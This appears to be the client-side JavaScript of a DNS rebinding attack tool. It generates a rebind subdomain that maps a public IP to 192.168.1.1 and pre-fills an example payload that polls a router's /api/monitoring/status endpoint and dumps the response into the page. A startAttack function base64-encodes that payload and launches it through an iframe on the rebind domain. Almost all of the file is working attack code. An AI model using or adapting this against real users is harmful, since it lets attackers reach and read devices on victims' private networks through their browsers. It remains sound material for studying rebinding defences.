var id = Math.random().toString(36).substr(2, 9)

var example = `
var timer = setInterval(function(){
  var xhr = new XMLHttpRequest()
  xhr.open('GET', '//' + $REBIND_DOMAIN + '/api/monitoring/status', false)
  xhr.send()

  if(xhr.status != 404){
    clearInterval(timer)
    document.body.innerHTML = xhr.responseText
  }

}, 10)
`


document.getElementById('rebinddomain').value = `${id}.81-4-124-10.192-168-1-1.rebind.43z.one`
document.getElementById('script').value = example

function startAttack(){
  var rebind_domain = document.getElementById('rebinddomain').value
  var script = document.getElementById('script').value.replace(new RegExp(/\$REBIND_DOMAIN/, 'g'),`"${rebind_domain}"` )
  document.getElementById("iframe").src = `//${rebind_domain}/attack?script=${btoa(script)}`
}
